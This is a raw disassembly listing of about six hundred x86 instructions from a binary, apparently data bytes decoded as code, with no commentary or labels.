  43178c:	9b                   	fwait
  43178d:	fc                   	cld
  43178e:	b8 68 65 5d 67       	mov    $0x675d6568,%eax
  431793:	d2 78 f7             	sarb   %cl,-0x9(%eax)
  431796:	1c f3                	sbb    $0xf3,%al
  431798:	68 10 49 a1 e6       	push   $0xe6a14910
  43179d:	22 80 a8 44 5c 29    	and    0x295c44a8(%eax),%al
  4317a3:	19 56 58             	sbb    %edx,0x58(%esi)
  4317a6:	02 1f                	add    (%edi),%bl
  4317a8:	e4 e4                	in     $0xe4,%al
  4317aa:	e9 3f 3f b2 82       	jmp    0x82f556ee
  4317af:	75 6d                	jne    0x43181e
  4317b1:	32 66 e3             	xor    -0x1d(%esi),%ah
  4317b4:	90                   	nop
  4317b5:	7c 5f                	jl     0x431816
  4317b7:	94                   	xchg   %eax,%esp
  4317b8:	bd 13 0a 23 a7       	mov    $0xa7230a13,%ebp
  4317bd:	7b b7                	jnp    0x431776
  4317bf:	02 01                	add    (%ecx),%al
  4317c1:	b4 bc                	mov    $0xbc,%ah
  4317c3:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4317c4:	3c 69                	cmp    $0x69,%al
  4317c6:	bc fd ac 09 49       	mov    $0x4909acfd,%esp
  4317cb:	d6                   	salc
  4317cc:	ef                   	out    %eax,(%dx)
  4317cd:	40                   	inc    %eax
  4317ce:	86 0d 86 42 ba 8a    	xchg   %cl,0x8aba4286
  4317d4:	fc                   	cld
  4317d5:	d6                   	salc
  4317d6:	74 91                	je     0x431769
  4317d8:	59                   	pop    %ecx
  4317d9:	83 4f a7 15          	orl    $0x15,-0x59(%edi)
  4317dd:	cc                   	int3
  4317de:	63 e7                	arpl   %esp,%edi
  4317e0:	88 9a 5f d9 e3 3f    	mov    %bl,0x3fe3d95f(%edx)
  4317e6:	e8 1a 88 78 4f       	call   0x4fbba005
  4317eb:	ab                   	stos   %eax,%es:(%edi)
  4317ec:	2a ef                	sub    %bh,%ch
  4317ee:	85 09                	test   %ecx,(%ecx)
  4317f0:	46                   	inc    %esi
  4317f1:	f5                   	cmc
  4317f2:	0b 37                	or     (%edi),%esi
  4317f4:	e4 7f                	in     $0x7f,%al
  4317f6:	e4 fd                	in     $0xfd,%al
  4317f8:	d3 2d ca a0 2d d6    	shrl   %cl,0xd62da0ca
  4317fe:	e1 7b                	loope  0x43187b
  431800:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  431801:	18 85 d2 65 31 1f    	sbb    %al,0x1f3165d2(%ebp)
  431807:	95                   	xchg   %eax,%ebp
  431808:	84 65 32             	test   %ah,0x32(%ebp)
  43180b:	15 d6 8f fb 08       	adc    $0x8fb8fd6,%eax
  431810:	91                   	xchg   %eax,%ecx
  431811:	95                   	xchg   %eax,%ebp
  431812:	96                   	xchg   %eax,%esi
  431813:	4b                   	dec    %ebx
  431814:	bd 1d e1 9d a3       	mov    $0xa39de11d,%ebp
  431819:	6c                   	insb   (%dx),%es:(%edi)
  43181a:	88 e2                	mov    %ah,%dl
  43181c:	c2 86 b0             	ret    $0xb086
  43181f:	4c                   	dec    %esp
  431820:	ce                   	into
  431821:	ca 58 09             	lret   $0x958
  431824:	7b 34                	jnp    0x43185a
  431826:	23 04 1b             	and    (%ebx,%ebx,1),%eax
  431829:	86 7c 22 df          	xchg   %bh,-0x21(%edx,%eiz,1)
  43182d:	cc                   	int3
  43182e:	fd                   	std
  43182f:	97                   	xchg   %eax,%edi
  431830:	e3 a2                	jecxz  0x4317d4
  431832:	3c fc                	cmp    $0xfc,%al
  431834:	cb                   	lret
  431835:	06                   	push   %es
  431836:	e0 98                	loopne 0x4317d0
  431838:	77 47                	ja     0x431881
  43183a:	ab                   	stos   %eax,%es:(%edi)
  43183b:	1a 24 8f             	sbb    (%edi,%ecx,4),%ah
  43183e:	24 64                	and    $0x64,%al
  431840:	3b 86 2d c5 37 a1    	cmp    -0x5ec83ad3(%esi),%eax
  431846:	49                   	dec    %ecx
  431847:	01 a9 ff 9f e5 40    	add    %ebp,0x40e59fff(%ecx)
  43184d:	e6 4a                	out    %al,$0x4a
  43184f:	fe 83 fb 1f b9 89    	incb   -0x7646e005(%ebx)
  431855:	4e                   	dec    %esi
  431856:	e0 0b                	loopne 0x431863
  431858:	17                   	pop    %ss
  431859:	90                   	nop
  43185a:	49                   	dec    %ecx
  43185b:	ec                   	in     (%dx),%al
  43185c:	e0 d2                	loopne 0x431830
  43185e:	84 7f 5b             	test   %bh,0x5b(%edi)
  431861:	54                   	push   %esp
  431862:	ac                   	lods   %ds:(%esi),%al
  431863:	c2 77 27             	ret    $0x2777
  431866:	bb 7e 33 d7 93       	mov    $0x93d7337e,%ebx
  43186b:	84 a1 a0 98 25 36    	test   %ah,0x362598a0(%ecx)
  431871:	06                   	push   %es
  431872:	8f                   	(bad)
  431873:	17                   	pop    %ss
  431874:	30 d2                	xor    %dl,%dl
  431876:	8b a4 34 0d d4 2a 46 	mov    0x462ad40d(%esp,%esi,1),%esp
  43187d:	6d                   	insl   (%dx),%es:(%edi)
  43187e:	86 5f 09             	xchg   %bl,0x9(%edi)
  431881:	41                   	inc    %ecx
  431882:	dd f9                	(bad)
  431884:	1d 24 07 85 26       	sbb    $0x26850724,%eax
  431889:	98                   	cwtl
  43188a:	8d                   	lea    (bad),%ebp
  43188b:	eb 68                	jmp    0x4318f5
  43188d:	9c                   	pushf
  43188e:	79 30                	jns    0x4318c0
  431890:	66 7e 72             	data16 jle 0x431905
  431893:	55                   	push   %ebp
  431894:	22 e2                	and    %dl,%ah
  431896:	fb                   	sti
  431897:	b2 33                	mov    $0x33,%dl
  431899:	00 87 66 7b 30 2d    	add    %al,0x2d307b66(%edi)
  43189f:	80 e3 62             	and    $0x62,%bl
  4318a2:	83 77 21 66          	xorl   $0x66,0x21(%edi)
  4318a6:	7c 3c                	jl     0x4318e4
  4318a8:	47                   	inc    %edi
  4318a9:	3c 03                	cmp    $0x3,%al
  4318ab:	6a 46                	push   $0x46
  4318ad:	90                   	nop
  4318ae:	49                   	dec    %ecx
  4318af:	55                   	push   %ebp
  4318b0:	1b 05 e8 61 98 21    	sbb    0x219861e8,%eax
  4318b6:	da 8e 6c 77 01 15    	fimull 0x1501776c(%esi)
  4318bc:	e5 d3                	in     $0xd3,%eax
  4318be:	98                   	cwtl
  4318bf:	08 9c 6d fa 28 9c 81 	or     %bl,-0x7e63d706(%ebp,%ebp,2)
  4318c6:	61                   	popa
  4318c7:	03 b2 20 c7 cc dd    	add    -0x223338e0(%edx),%esi
  4318cd:	11 53 2b             	adc    %edx,0x2b(%ebx)
  4318d0:	f7 52 47             	notl   0x47(%edx)
  4318d3:	ad                   	lods   %ds:(%esi),%eax
  4318d4:	de e4                	fsubp  %st,%st(4)
  4318d6:	99                   	cltd
  4318d7:	14 f3                	adc    $0xf3,%al
  4318d9:	46                   	inc    %esi
  4318da:	78 27                	js     0x431903
  4318dc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4318dd:	7b 25                	jnp    0x431904
  4318df:	bc 9a f6 b4 41       	mov    $0x41b4f69a,%esp
  4318e4:	05 4f e1 e0 c1       	add    $0xc1e0e14f,%eax
  4318e9:	aa                   	stos   %al,%es:(%edi)
  4318ea:	07                   	pop    %es
  4318eb:	ed                   	in     (%dx),%eax
  4318ec:	a3 38 ce 7c cf       	mov    %eax,0xcf7cce38
  4318f1:	38 23                	cmp    %ah,(%ebx)
  4318f3:	c8 2f 02 11          	enter  $0x22f,$0x11
  4318f7:	29 33                	sub    %esi,(%ebx)
  4318f9:	e1 80                	loope  0x43187b
  4318fb:	90                   	nop
  4318fc:	03 06                	add    (%esi),%eax
  4318fe:	63 03                	arpl   %eax,(%ebx)
  431900:	86 c5                	xchg   %al,%ch
  431902:	70 65                	jo     0x431969
  431904:	c3                   	ret
  431905:	0d 77 1b 55 5c       	or     $0x5c551b77,%eax
  43190a:	bd c2 6d 30 7d       	mov    $0x7d306dc2,%ebp
  43190f:	22 5d dc             	and    -0x24(%ebp),%bl
  431912:	10 80 ea 1f 8a a6    	adc    %al,-0x5975e016(%eax)
  431918:	73 a4                	jae    0x4318be
  43191a:	64 ec                	fs in  (%dx),%al
  43191c:	96                   	xchg   %eax,%esi
  43191d:	c8 75 d7 ca          	enter  $0xd775,$0xca
  431921:	78 63                	js     0x431986
  431923:	89 41 f6             	mov    %eax,-0xa(%ecx)
  431926:	0c e6                	or     $0xe6,%al
  431928:	e5 07                	in     $0x7,%eax
  43192a:	b2 1a                	mov    $0x1a,%dl
  43192c:	24 ff                	and    $0xff,%al
  43192e:	07                   	pop    %es
  43192f:	b2 e8                	mov    $0xe8,%dl
  431931:	78 42                	js     0x431975
  431933:	81 a9 07 27 60 af 67 	subl   $0x3ea2c167,-0x509fd8f9(%ecx)
  43193a:	c1 a2 3e 
  43193d:	bb 38 b0 1c 97       	mov    $0x971cb038,%ebx
  431942:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  431943:	c0 62 8b b4          	shlb   $0xb4,-0x75(%edx)
  431947:	06                   	push   %es
  431948:	fe ca                	dec    %dl
  43194a:	9a 38 8d 88 e6 6d ad 	lcall  $0xad6d,$0xe6888d38
  431951:	09 15 b3 e5 97 36    	or     %edx,0x3697e5b3
  431957:	4a                   	dec    %edx
  431958:	c4 9e 0f d0 2c 44    	les    0x442cd00f(%esi),%ebx
  43195e:	40                   	inc    %eax
  43195f:	f1                   	int1
  431960:	6e                   	outsb  %ds:(%esi),(%dx)
  431961:	63 cb                	arpl   %ecx,%ebx
  431963:	ce                   	into
  431964:	32 50 f6             	xor    -0xa(%eax),%dl
  431967:	cc                   	int3
  431968:	b2 26                	mov    $0x26,%dl
  43196a:	68 fc 1e b3 47       	push   $0x47b31efc
  43196f:	36 c4 1a             	les    %ss:(%edx),%ebx
  431972:	74 91                	je     0x431905
  431974:	22 df                	and    %bh,%bl
  431976:	25 15 80 94 3a       	and    $0x3a948015,%eax
  43197b:	f5                   	cmc
  43197c:	4e                   	dec    %esi
  43197d:	e8 1b 5d 1a d4       	call   0xd45d769d
  431982:	33 76 c0             	xor    -0x40(%esi),%esi
  431985:	12 a0 3a 5a 08 58    	adc    0x58085a3a(%eax),%ah
  43198b:	f3 8b 71 38          	repz mov 0x38(%ecx),%esi
  43198f:	5a                   	pop    %edx
  431990:	b6 39                	mov    $0x39,%dh
  431992:	9b                   	fwait
  431993:	33 76 a1             	xor    -0x5f(%esi),%esi
  431996:	b2 82                	mov    $0x82,%dl
  431998:	ab                   	stos   %eax,%es:(%edi)
  431999:	3f                   	aas
  43199a:	5c                   	pop    %esp
  43199b:	f4                   	hlt
  43199c:	f8                   	clc
  43199d:	96                   	xchg   %eax,%esi
  43199e:	09 e8                	or     %ebp,%eax
  4319a0:	6c                   	insb   (%dx),%es:(%edi)
  4319a1:	78 f1                	js     0x431994
  4319a3:	e7 58                	out    %eax,$0x58
  4319a5:	a8 25                	test   $0x25,%al
  4319a7:	9d                   	popf
  4319a8:	b4 4a                	mov    $0x4a,%ah
  4319aa:	7d 55                	jge    0x431a01
  4319ac:	bd 8d 11 c3 37       	mov    $0x37c3118d,%ebp
  4319b1:	d1 d5                	rcl    $1,%ebp
  4319b3:	76 0f                	jbe    0x4319c4
  4319b5:	30 02                	xor    %al,(%edx)
  4319b7:	3d cd 13 27 d6       	cmp    $0xd62713cd,%eax
  4319bc:	64 c9                	fs leave
  4319be:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4319bf:	3b ac ed cc a0 6d 22 	cmp    0x226da0cc(%ebp,%ebp,8),%ebp
  4319c6:	ff 19                	lcall  *(%ecx)
  4319c8:	03 50 27             	add    0x27(%eax),%edx
  4319cb:	13 3d dc 54 c6 79    	adc    0x79c654dc,%edi
  4319d1:	86 09                	xchg   %cl,(%ecx)
  4319d3:	4f                   	dec    %edi
  4319d4:	ea a3 67 39 35 93 45 	ljmp   $0x4593,$0x353967a3
  4319db:	58                   	pop    %eax
  4319dc:	06                   	push   %es
  4319dd:	17                   	pop    %ss
  4319de:	ae                   	scas   %es:(%edi),%al
  4319df:	e2 ba                	loop   0x43199b
  4319e1:	65 11 d1             	gs adc %edx,%ecx
  4319e4:	82 94 91 c1 64 5b 63 	adcb   $0x87,0x635b64c1(%ecx,%edx,4)
  4319eb:	87 
  4319ec:	e1 a8                	loope  0x431996
  4319ee:	88 c9                	mov    %cl,%cl
  4319f0:	e0 4c                	loopne 0x431a3e
  4319f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4319f3:	8f                   	(bad)
  4319f4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4319f5:	5a                   	pop    %edx
  4319f6:	3f                   	aas
  4319f7:	0e                   	push   %cs
  4319f8:	db 42 51             	fildl  0x51(%edx)
  4319fb:	12 d9                	adc    %cl,%bl
  4319fd:	fc                   	cld
  4319fe:	c9                   	leave
  4319ff:	58                   	pop    %eax
  431a00:	45                   	inc    %ebp
  431a01:	02 ed                	add    %ch,%ch
  431a03:	7c 58                	jl     0x431a5d
  431a05:	b0 0b                	mov    $0xb,%al
  431a07:	a2 27 ea 28 32       	mov    %al,0x3228ea27
  431a0c:	b5 6a                	mov    $0x6a,%ch
  431a0e:	3c 16                	cmp    $0x16,%al
  431a10:	27                   	daa
  431a11:	df 1f                	fistps (%edi)
  431a13:	14 23                	adc    $0x23,%al
  431a15:	44                   	inc    %esp
  431a16:	ae                   	scas   %es:(%edi),%al
  431a17:	9a 69 21 63 35 38 5a 	lcall  $0x5a38,$0x35632169
  431a1e:	93                   	xchg   %eax,%ebx
  431a1f:	fa                   	cli
  431a20:	1f                   	pop    %ds
  431a21:	01 5b b0             	add    %ebx,-0x50(%ebx)
  431a24:	2b 07                	sub    (%edi),%eax
  431a26:	9f                   	lahf
  431a27:	d0 6b 5b             	shrb   $1,0x5b(%ebx)
  431a2a:	52                   	push   %edx
  431a2b:	28 93 c2 a8 d8 53    	sub    %dl,0x53d8a8c2(%ebx)
  431a31:	d4 1c                	aam    $0x1c
  431a33:	cd d4                	int    $0xd4
  431a35:	08 9a 75 d6 ac 0b    	or     %bl,0xbacd675(%edx)
  431a3b:	df 96 ac ba 1d 5b    	fists  0x5b1dbaac(%esi)
  431a41:	95                   	xchg   %eax,%ebp
  431a42:	3e 1f                	ds pop %ds
  431a44:	c3                   	ret
  431a45:	ba 65 0f a3 50       	mov    $0x50a30f65,%edx
  431a4a:	61                   	popa
  431a4b:	5e                   	pop    %esi
  431a4c:	3c 03                	cmp    $0x3,%al
  431a4e:	b3 ef                	mov    $0xef,%bl
  431a50:	c6 82 9d 57 c7 fd 66 	movb   $0x66,-0x238a863(%edx)
  431a57:	fb                   	sti
  431a58:	8b b5 2a c5 22 16    	mov    0x1622c52a(%ebp),%esi
  431a5e:	0f c5                	pextrw $0xc5,(bad),%esi
  431a60:	30 5c 97 4a          	xor    %bl,0x4a(%edi,%edx,4)
  431a64:	5d                   	pop    %ebp
  431a65:	10 48 54             	adc    %cl,0x54(%eax)
  431a68:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  431a69:	87 90 02 0a f9 dc    	xchg   %edx,-0x2306f5fe(%eax)
  431a6f:	db 0d 01 c0 d1 a9    	fisttpl 0xa9d1c001
  431a75:	5b                   	pop    %ebx
  431a76:	50                   	push   %eax
  431a77:	9e                   	sahf
  431a78:	9d                   	popf
  431a79:	82 d3 83             	adc    $0x83,%bl
  431a7c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  431a7d:	29 83 8b 85 96 d4    	sub    %eax,-0x2b697a75(%ebx)
  431a83:	52                   	push   %edx
  431a84:	54                   	push   %esp
  431a85:	e5 76                	in     $0x76,%eax
  431a87:	7e 7d                	jle    0x431b06
  431a89:	44                   	inc    %esp
  431a8a:	a8 6e                	test   $0x6e,%al
  431a8c:	98                   	cwtl
  431a8d:	9e                   	sahf
  431a8e:	4f                   	dec    %edi
  431a8f:	0a 80 a4 65 51 0d    	or     0xd5165a4(%eax),%al
  431a95:	8a 56 df             	mov    -0x21(%esi),%dl
  431a98:	9f                   	lahf
  431a99:	d1 15 a4 db 04 21    	rcll   $1,0x2104dba4
  431a9f:	13 b4 df a5 af 79 0f 	adc    0xf79afa5(%edi,%ebx,8),%esi
  431aa6:	e0 32                	loopne 0x431ada
  431aa8:	b0 95                	mov    $0x95,%al
  431aaa:	66 10 83 a0 d4 35 54 	data16 adc %al,0x5435d4a0(%ebx)
  431ab1:	a0 1d 32 0c f7       	mov    0xf70c321d,%al
  431ab6:	ca 7d 8a             	lret   $0x8a7d
  431ab9:	89 05 98 cb ba 7f    	mov    %eax,0x7fbacb98
  431abf:	3a 66 fe             	cmp    -0x2(%esi),%ah
  431ac2:	b3 f5                	mov    $0xf5,%bl
  431ac4:	de 01                	fiadds (%ecx)
  431ac6:	8e b2 3e fb 33 96    	mov    -0x69cc04c2(%edx),%?
  431acc:	d4 77                	aam    $0x77
  431ace:	98                   	cwtl
  431acf:	7e b2                	jle    0x431a83
  431ad1:	8a cb                	mov    %bl,%cl
  431ad3:	bc 64 05 33 f8       	mov    $0xf8330564,%esp
  431ad8:	75 f7                	jne    0x431ad1
  431ada:	bb 13 7b ed b4       	mov    $0xb4ed7b13,%ebx
  431adf:	33 df                	xor    %edi,%ebx
  431ae1:	c0 b5 37 23 95 b6 3f 	shlb   $0x3f,-0x496adcc9(%ebp)
  431ae8:	4a                   	dec    %edx
  431ae9:	04 a6                	add    $0xa6,%al
  431aeb:	4d                   	dec    %ebp
  431aec:	cd 2e                	int    $0x2e
  431aee:	fd                   	std
  431aef:	3a f0                	cmp    %al,%dh
  431af1:	f5                   	cmc
  431af2:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  431af3:	63 08                	arpl   %ecx,(%eax)
  431af5:	c7                   	(bad)
  431af6:	4a                   	dec    %edx
  431af7:	b9 60 5b 63 26       	mov    $0x26635b60,%ecx
  431afc:	9d                   	popf
  431afd:	1c db                	sbb    $0xdb,%al
  431aff:	71 31                	jno    0x431b32
  431b01:	ae                   	scas   %es:(%edi),%al
  431b02:	8e 7d 53             	mov    0x53(%ebp),%?
  431b05:	1e                   	push   %ds
  431b06:	aa                   	stos   %al,%es:(%edi)
  431b07:	d4 bf                	aam    $0xbf
  431b09:	44                   	inc    %esp
  431b0a:	03 c7                	add    %edi,%eax
  431b0c:	08 a9 f9 1e 3a af    	or     %ch,-0x50c5e107(%ecx)
  431b12:	f3 9d                	repz popf
  431b14:	6d                   	insl   (%dx),%es:(%edi)
  431b15:	b1 d2                	mov    $0xd2,%cl
  431b17:	04 72                	add    $0x72,%al
  431b19:	de 6c ff 1d          	fisubrs 0x1d(%edi,%edi,8)
  431b1d:	5d                   	pop    %ebp
  431b1e:	f5                   	cmc
  431b1f:	ef                   	out    %eax,(%dx)
  431b20:	bc 85 ed 8c 78       	mov    $0x788ced85,%esp
  431b25:	55                   	push   %ebp
  431b26:	52                   	push   %edx
  431b27:	78 96                	js     0x431abf
  431b29:	96                   	xchg   %eax,%esi
  431b2a:	c1 33 55             	shll   $0x55,(%ebx)
  431b2d:	1e                   	push   %ds
  431b2e:	6b 05 02 d7 ed 72 ca 	imul   $0xffffffca,0x72edd702,%eax
  431b35:	5a                   	pop    %edx
  431b36:	7c 6a                	jl     0x431ba2
  431b38:	b3 1d                	mov    $0x1d,%bl
  431b3a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  431b3b:	ef                   	out    %eax,(%dx)
  431b3c:	b3 fc                	mov    $0xfc,%bl
  431b3e:	f8                   	clc
  431b3f:	0f 2c e6             	cvttps2pi %xmm6,%mm4
  431b42:	eb b7                	jmp    0x431afb
  431b44:	4c                   	dec    %esp
  431b45:	49                   	dec    %ecx
  431b46:	3b ce                	cmp    %esi,%ecx
  431b48:	71 51                	jno    0x431b9b
  431b4a:	80 d0 0b             	adc    $0xb,%al
  431b4d:	3d 7a 27 54 54       	cmp    $0x5454277a,%eax
  431b52:	3e f7 1f             	negl   %ds:(%edi)
  431b55:	ae                   	scas   %es:(%edi),%al
  431b56:	6f                   	outsl  %ds:(%esi),(%dx)
  431b57:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  431b58:	ef                   	out    %eax,(%dx)
  431b59:	30 25 a9 af 2b 81    	xor    %ah,0x812bafa9
  431b5f:	d5 d7                	aad    $0xd7
  431b61:	56                   	push   %esi
  431b62:	ff 25 cf 88 a9 e3    	jmp    *0xe3a988cf
  431b68:	05 90 8b 65 47       	add    $0x47658b90,%eax
  431b6d:	76 d0                	jbe    0x431b3f
  431b6f:	9a a1 44 06 2c 20 45 	lcall  $0x4520,$0x2c0644a1
  431b76:	cd af                	int    $0xaf
  431b78:	5d                   	pop    %ebp
  431b79:	58                   	pop    %eax
  431b7a:	b7 32                	mov    $0x32,%bh
  431b7c:	99                   	cltd
  431b7d:	4b                   	dec    %ebx
  431b7e:	e2 fd                	loop   0x431b7d
  431b80:	9f                   	lahf
  431b81:	c4 aa a9 12 c3 1e    	les    0x1ec312a9(%edx),%ebp
  431b87:	ab                   	stos   %eax,%es:(%edi)
  431b88:	f7 c4 78 26 79 12    	test   $0x12792678,%esp
  431b8e:	8c 45 d5             	mov    %es,-0x2b(%ebp)
  431b91:	a2 59 94 b6 95       	mov    %al,0x95b69459
  431b96:	87 38                	xchg   %edi,(%eax)
  431b98:	9b                   	fwait
  431b99:	4f                   	dec    %edi
  431b9a:	ac                   	lods   %ds:(%esi),%al
  431b9b:	45                   	inc    %ebp
  431b9c:	d2 20                	shlb   %cl,(%eax)
  431b9e:	88 af ce 93 12 d2    	mov    %ch,-0x2ded6c32(%edi)
  431ba4:	f7 9b 02 7d 3e 8f    	negl   -0x70c182fe(%ebx)
  431baa:	dd 78 63             	fnstsw 0x63(%eax)
  431bad:	21 a0 0a 40 e7 bc    	and    %esp,-0x4318bff6(%eax)
  431bb3:	83 0b 4d             	orl    $0x4d,(%ebx)
  431bb6:	18 17                	sbb    %dl,(%edi)
  431bb8:	98                   	cwtl
  431bb9:	bf a8 51 7f 74       	mov    $0x747f51a8,%edi
  431bbe:	35 73 ae 7c c9       	xor    $0xc97cae73,%eax
  431bc3:	2c 9a                	sub    $0x9a,%al
  431bc5:	3a 8e 7a c9 e9 ae    	cmp    -0x51163686(%esi),%cl
  431bcb:	7c b1                	jl     0x431b7e
  431bcd:	cf                   	iret
  431bce:	bb 91 a3 cb 97       	mov    $0x97cba391,%ebx
  431bd3:	55                   	push   %ebp
  431bd4:	36 97                	ss xchg %eax,%edi
  431bd6:	56                   	push   %esi
  431bd7:	57                   	push   %edi
  431bd8:	b2 ea                	mov    $0xea,%dl
  431bda:	e8 f3 59 9f 02       	call   0x2e275d2
  431bdf:	b0 b3                	mov    $0xb3,%al
  431be1:	76 64                	jbe    0x431c47
  431be3:	dd e2                	fucom  %st(2)
  431be5:	d9 7d eb             	fnstcw -0x15(%ebp)
  431be8:	52                   	push   %edx
  431be9:	6c                   	insb   (%dx),%es:(%edi)
  431bea:	99                   	cltd
  431beb:	bb a3 0d 2c 2a       	mov    $0x2a2c0da3,%ebx
  431bf0:	a1 89 71 28 4b       	mov    0x4b287189,%eax
  431bf5:	67 c3                	addr16 ret
  431bf7:	3b b5 b8 67 14 77    	cmp    0x771467b8(%ebp),%esi
  431bfd:	a9 8e fd dd a1       	test   $0xa1ddfd8e,%eax
  431c02:	03 58 c0             	add    -0x40(%eax),%ebx
  431c05:	20 2f                	and    %ch,(%edi)
  431c07:	36 56                	ss push %esi
  431c09:	ae                   	scas   %es:(%edi),%al
  431c0a:	48                   	dec    %eax
  431c0b:	3a 2d d7 ef d4 72    	cmp    0x72d4efd7,%ch
  431c11:	d1 36                	shll   $1,(%esi)
  431c13:	37                   	aaa
  431c14:	de 0e                	fimuls (%esi)
  431c16:	60                   	pusha
  431c17:	e4 69                	in     $0x69,%al
  431c19:	24 76                	and    $0x76,%al
  431c1b:	df 1f                	fistps (%edi)
  431c1d:	39 d2                	cmp    %edx,%edx
  431c1f:	87 a8 ca 78 1d fe    	xchg   %ebp,-0x1e28736(%eax)
  431c25:	79 b3                	jns    0x431bda
  431c27:	98                   	cwtl
  431c28:	bc 5b cf b7 68       	mov    $0x68b7cf5b,%esp
  431c2d:	39 7d 73             	cmp    %edi,0x73(%ebp)
  431c30:	5f                   	pop    %edi
  431c31:	3e dd 95 da 5b 40 ab 	fstl   %ds:-0x54bfa426(%ebp)
  431c38:	fd                   	std
  431c39:	c0 28 ba             	shrb   $0xba,(%eax)
  431c3c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  431c3d:	d0 81 6a 70 47 8a    	rolb   $1,-0x75b88f96(%ecx)
  431c43:	b2 84                	mov    $0x84,%dl
  431c45:	48                   	dec    %eax
  431c46:	60                   	pusha
  431c47:	ce                   	into
  431c48:	2b 07                	sub    (%edi),%eax
  431c4a:	38 66 02             	cmp    %ah,0x2(%esi)
  431c4d:	4d                   	dec    %ebp
  431c4e:	a0 22 a7 94 0b       	mov    0xb94a722,%al
  431c53:	82 26 ff             	andb   $0xff,(%esi)
  431c56:	60                   	pusha
  431c57:	89 25 39 ad 96 73    	mov    %esp,0x7396ad39
  431c5d:	47                   	inc    %edi
  431c5e:	cf                   	iret
  431c5f:	1f                   	pop    %ds
  431c60:	50                   	push   %eax
  431c61:	7d 42                	jge    0x431ca5
  431c63:	a1 d7 ce e5 92       	mov    0x92e5ced7,%eax
  431c68:	21 8a 85 a6 5f 68    	and    %ecx,0x685fa685(%edx)
  431c6e:	87 c9                	xchg   %ecx,%ecx
  431c70:	a9 fc 38 c4 77       	test   $0x77c438fc,%eax
  431c75:	22 eb                	and    %bl,%ch
  431c77:	68 23 26 7e 79       	push   $0x797e2623
  431c7c:	c5 5e b4             	lds    -0x4c(%esi),%ebx
  431c7f:	ae                   	scas   %es:(%edi),%al
  431c80:	11 4a c8             	adc    %ecx,-0x38(%edx)
  431c83:	bb b9 09 18 69       	mov    $0x691809b9,%ebx
  431c88:	bc ea b0 23 5d       	mov    $0x5d23b0ea,%esp
  431c8d:	7b 0e                	jnp    0x431c9d
  431c8f:	9a d9 f2 58 da 40 42 	lcall  $0x4240,$0xda58f2d9
  431c96:	dc c7                	fadd   %st,%st(7)
  431c98:	3b c3                	cmp    %ebx,%eax
  431c9a:	e3 4c                	jecxz  0x431ce8
  431c9c:	01 f8                	add    %edi,%eax
  431c9e:	cc                   	int3
  431c9f:	d2 b8 4b 1f e7 0f    	sarb   %cl,0xfe71f4b(%eax)
  431ca5:	fc                   	cld
  431ca6:	dd bd dc 5e 8e 3d    	fnstsw 0x3d8e5edc(%ebp)
  431cac:	83 73 e1 d1          	xorl   $0xffffffd1,-0x1f(%ebx)
  431cb0:	5c                   	pop    %esp
  431cb1:	89 f4                	mov    %esi,%esp
  431cb3:	83 6f a4 66          	subl   $0x66,-0x5c(%edi)
  431cb7:	ce                   	into
  431cb8:	47                   	inc    %edi
  431cb9:	a9 90 82 94 82       	test   $0x82948290,%eax
  431cbe:	0f a1                	pop    %fs
  431cc0:	14 74                	adc    $0x74,%al
  431cc2:	4e                   	dec    %esi
  431cc3:	23 e7                	and    %edi,%esp
  431cc5:	8c ab 61 a0 a9 be    	mov    %gs,-0x41565f9f(%ebx)
  431ccb:	d1 12                	rcll   $1,(%edx)
  431ccd:	31 73 06             	xor    %esi,0x6(%ebx)
  431cd0:	7f 3e                	jg     0x431d10
  431cd2:	62 01                	bound  %eax,(%ecx)
  431cd4:	5a                   	pop    %edx
  431cd5:	af                   	scas   %es:(%edi),%eax
  431cd6:	37                   	aaa
  431cd7:	f6 6f 5d             	imulb  0x5d(%edi)
  431cda:	9c                   	pushf
  431cdb:	d6                   	salc
  431cdc:	d8 fa                	fdivr  %st(2),%st
  431cde:	63 fe                	arpl   %edi,%esi
  431ce0:	a0 7e 68 28 c9       	mov    0xc928687e,%al
  431ce5:	2d 7f e2 2b eb       	sub    $0xeb2be27f,%eax
  431cea:	e8 2a 81 18 14       	call   0x145b9e19
  431cef:	63 46 61             	arpl   %eax,0x61(%esi)
  431cf2:	12 8e 51 5c 4e 1c    	adc    0x1c4e5c51(%esi),%cl
  431cf8:	b3 3c                	mov    $0x3c,%bl
  431cfa:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  431cfb:	79 79                	jns    0x431d76
  431cfd:	2b d5                	sub    %ebp,%edx
  431cff:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  431d00:	d6                   	salc
  431d01:	00 61 bc             	add    %ah,-0x44(%ecx)
  431d04:	ab                   	stos   %eax,%es:(%edi)
  431d05:	ab                   	stos   %eax,%es:(%edi)
  431d06:	27                   	daa
  431d07:	72 1a                	jb     0x431d23
  431d09:	48                   	dec    %eax
  431d0a:	7d a8                	jge    0x431cb4
  431d0c:	64 30 d6             	fs xor %dl,%dh
  431d0f:	ab                   	stos   %eax,%es:(%edi)
  431d10:	ea 26 55 7e d4 31 a8 	ljmp   $0xa831,$0xd47e5526
  431d17:	e6 0a                	out    %al,$0xa
  431d19:	89 3c de             	mov    %edi,(%esi,%ebx,8)
  431d1c:	8d 5c b9 de          	lea    -0x22(%ecx,%edi,4),%ebx
  431d20:	02 8d 82 f2 0a 13    	add    0x130af282(%ebp),%cl
  431d26:	02 b7 18 0e 73 46    	add    0x46730e18(%edi),%dh
  431d2c:	0b 13                	or     (%ebx),%edx
  431d2e:	f4                   	hlt
  431d2f:	d4 e1                	aam    $0xe1
  431d31:	72 4b                	jb     0x431d7e
  431d33:	f7 6b 55             	imull  0x55(%ebx)
  431d36:	c6                   	(bad)
  431d37:	90                   	nop
  431d38:	2b f6                	sub    %esi,%esi
  431d3a:	5c                   	pop    %esp
  431d3b:	a1 89 eb 01 67       	mov    0x6701eb89,%eax
